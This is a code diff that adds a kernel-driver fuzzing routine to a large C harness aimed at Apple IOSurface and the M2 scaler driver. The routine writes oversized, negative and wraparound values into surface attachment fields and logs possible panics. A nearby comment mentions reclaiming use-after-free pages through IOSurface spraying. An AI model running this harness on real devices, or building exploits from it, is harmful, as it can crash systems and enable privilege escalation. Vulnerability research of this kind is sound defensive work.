@@ -18688,6 +18688,141 @@ static void p_iosurfdeep(void) {
     LOG("[isd] done (alive), cases %ld", caseidx);
 }
 
+// V113: s27down — downstream consumers of a surface carrying hostile sel27
+// bulk attachments. Each attachment field (isd_flds — sizes/offsets/strides
+// candidates among them) is written with combat values on our own coresurf
+// conn, then the surface is fed to the scaler (as src AND as dst — scaler
+// conn is separate; IOSurfaceID is global) and to lock/gather readback.
+// Env: FUZZ_S27DOWN_SKIP=N (deterministic numbering). Tag [s27d].
+static void p_s27down(void) {
+    long skip = atol(getenv("FUZZ_S27DOWN_SKIP") ?: "0");
+    long caseidx = 0;
+    LOG("[s27d] v113 downstream of sel27 attachments, skip %ld", skip);
+    // coresurf conn + surface (owner check: same-conn only)
+    io_service_t s = IOServiceGetMatchingService(kIOMainPortDefault,
+                        IOServiceMatching("IOCoreSurfaceRoot"));
+    if (!s) s = IOServiceGetMatchingService(kIOMainPortDefault, IOServiceMatching("IOSurfaceRoot"));
+    if (!s) { LOG("[s27d] service not found"); return; }
+    io_connect_t c = 0;
+    kern_return_t ko = IOServiceOpen(s, mach_task_self(), 0, &c);
+    IOObjectRelease(s);
+    LOG("[s27d] coresurf open type 0 -> kr 0x%08x conn 0x%x", ko, c);
+    if (ko || !c) return;
+    {
+        uint8_t o[64];
+        size_t osz = 40;
+        uint64_t osc[4] = {0,0,0,0};
+        uint32_t nosc = 0;
+        IOConnectCallMethod(c, 13, NULL, 0, NULL, 0, osc, &nosc, o, &osz);
+    }
+    uint32_t sid = 0;
+    {
+        uint8_t inb[0x40], outb[3176];
+        memset(inb, 0, sizeof inb);
+        memset(outb, 0, sizeof outb);
+        *(uint32_t *)(inb + 0x08) = 64;
+        *(uint32_t *)(inb + 0x0c) = 64;
+        *(uint32_t *)(inb + 0x10) = 0x42475241;
+        *(uint32_t *)(inb + 0x14) = 4;
+        *(uint32_t *)(inb + 0x18) = 256;
+        *(uint32_t *)(inb + 0x1c) = 0x4000;
+        size_t osz = 3176;
+        uint64_t osc[4] = {0,0,0,0};
+        uint32_t nosc = 0;
+        kern_return_t k = IOConnectCallMethod(c, 6, NULL, 0, inb, 32, osc, &nosc, outb, &osz);
+        sid = *(uint32_t *)(outb + 0x18);
+        LOG("[s27d] sel6 create -> kr 0x%08x sid %u", k, sid);
+    }
+    if (!sid) { LOG("[s27d] no surface, abort"); return; }
+    // separate scaler conn + a plain destination surface
+    io_connect_t sc = open_service("AppleM2ScalerCSCDriver", 0);
+    if (!sc) { LOG("[s27d] no scaler conn, abort"); return; }
+    IOSurfaceRef dstsf = make_surface(64, 64);
+    IOSurfaceID dstid = dstsf ? IOSurfaceGetID(dstsf) : g_s2;
+    LOG("[s27d] scaler conn 0x%x dst sid %u (ours %u)", sc, dstid, sid);
+    uint8_t *req = must_map(0x1000);
+
+    // portability sanity: does the scaler accept a sid created on the coresurf conn?
+    caseidx++;
+    if (caseidx > skip) {
+        craft_transform(req, sid, dstid, 64, 64);
+        LOG("[s27d] c%ld portability probe: scaler src=our sid %u ...", caseidx, sid);
+        fsync(fileno(stderr));
+        kern_return_t k = scaler_call1(sc, req);
+        LOG("[s27d] c%ld scaler(our sid as src) -> kr 0x%08x %s", caseidx, k,
+            k == 0xe00002f0 ? "*** SID NOT PORTABLE to scaler conn" : (k ? "(rejected)" : "ok"));
+    }
+
+    // combat values: giant / negative / 4GB+offset wrap pairs
+    static const struct { const char *n; uint64_t v; } batt[] = {
+        { "0x7fffffff", 0x7fffffffULL },
+        { "u64max", 0xffffffffffffffffULL },
+        { "4G+0x100", 0x100000100ULL },
+        { "4G+0x4000", 0x100004000ULL },
+        { "neg32", 0xffffffffULL },
+        { "0x80000000", 0x80000000ULL },
+    };
+    for (unsigned fi = 0; fi < sizeof(isd_flds)/sizeof(isd_flds[0]); fi++) {
+        for (unsigned vi = 0; vi < sizeof(batt)/sizeof(batt[0]); vi++) {
+            caseidx++;
+            if (caseidx <= skip) continue;
+            uint8_t f[160];
+            memset(f, 0, 160);
+            uint64_t v = batt[vi].v;
+            for (int b = 0; b < isd_flds[fi].len; b++)
+                f[isd_flds[fi].off + b] = (uint8_t)(v >> (8 * (b & 7)));
+            *(uint64_t *)(f + 0x90) = 1ULL << isd_flds[fi].bit;
+            *(uint32_t *)(f + 0x98) = sid;
+            kern_return_t kw = isd_s27(c, f);
+            if (kw) {
+                LOG("[s27d] c%ld field bit%u off 0x%x = %s -> write kr 0x%08x, SKIP",
+                    caseidx, isd_flds[fi].bit, isd_flds[fi].off, batt[vi].n, kw);
+                continue;
+            }
+            // (a) scaler with our surface as SRC
+            LOG("[s27d] c%ld field bit%u off 0x%x = %s — scaler src=ours (PANIC possible)",
+                caseidx, isd_flds[fi].bit, isd_flds[fi].off, batt[vi].n);
+            fsync(fileno(stderr));
+            craft_transform(req, sid, dstid, 64, 64);
+            kern_return_t ka = scaler_call1(sc, req);
+            // (b) scaler with our surface as DST (scaler writes into it)
+            LOG("[s27d] c%ld field bit%u off 0x%x = %s — scaler dst=ours (PANIC possible)",
+                caseidx, isd_flds[fi].bit, isd_flds[fi].off, batt[vi].n);
+            fsync(fileno(stderr));
+            craft_transform(req, g_s1, sid, 64, 64);
+            kern_return_t kb = scaler_call1(sc, req);
+            // (c) lock + gather readback on the coresurf conn
+            uint8_t lin[12], lo[3176];
+            memset(lin, 0, sizeof lin);
+            *(uint32_t *)lin = sid;
+            size_t losz = 3176;
+            uint64_t osc[4] = {0,0,0,0};
+            uint32_t nosc = 0;
+            kern_return_t kl = IOConnectCallMethod(c, 2, NULL, 0, lin, 12, osc, &nosc, lo, &losz);
+            uint64_t g64 = sid;
+            uint8_t g[64];
+            size_t gsz = 64;
+            kern_return_t kg = IOConnectCallMethod(c, 30, &g64, 1, NULL, 0, NULL, NULL, g, &gsz);
+            size_t uosz = 4;
+            uint32_t nosc2 = 0;
+            kern_return_t ku = IOConnectCallMethod(c, 3, NULL, 0, lin, 12, osc, &nosc2, lo, &uosz);
+            LOG("[s27d] c%ld field bit%u off 0x%x = %s -> w ok scalerA 0x%08x scalerB 0x%08x "
+                "lock 0x%08x gather 0x%08x gsz 0x%zx bytes %02x %02x %02x %02x %s",
+                caseidx, isd_flds[fi].bit, isd_flds[fi].off, batt[vi].n,
+                ka, kb, kl, kg, gsz, g[0], g[1], g[2], g[3],
+                (ka || kb || kl) ? "*** ANOMALY" : "");
+            usleep(2000);
+        }
+    }
+    {
+        uint64_t r = sid;
+        kern_return_t k = IOConnectCallScalarMethod(c, 1, &r, 1, NULL, NULL);
+        LOG("[s27d] release sid %u -> kr 0x%08x", sid, k);
+    }
+    if (dstsf) CFRelease(dstsf);
+    LOG("[s27d] done (alive), cases %ld", caseidx);
+}
+
 // V110: (A) reclaim UAF pages via IOSurface spray; (B) deep IOSurface fuzz
 // (sel9 manual IOCFSerialize binary blobs, sel27 bulk-attachment frames).
 #include <IOKit/IOCFSerialize.h>
@@ -18973,6 +19108,7 @@ void *t_iosurface_scaler(void *arg) {
         if (getenv("FUZZ_LASTMILE")) { p_lastmile(); LOG("[probe13] lastmile-only mode, stop"); return NULL; }
         if (getenv("FUZZ_CORESURF")) { p_coresurf(); LOG("[probe13] coresurf-only mode, stop"); return NULL; }
         if (getenv("FUZZ_IOSURFDEEP")) { p_iosurfdeep(); LOG("[probe13] iosurfdeep-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_S27DOWN")) { p_s27down(); LOG("[probe13] s27down-only mode, stop"); return NULL; }
         if (getenv("FUZZ_UAT")) { p_uat(); LOG("[probe13] uat-only mode, stop"); return NULL; }
         if (getenv("FUZZ_UATREC")) { p_uatrec(); LOG("[probe13] uatrec-only mode, stop"); return NULL; }
         if (getenv("FUZZ_RECLAIM2")) { p_reclaim2(); LOG("[probe13] reclaim2-only mode, stop"); return NULL; }
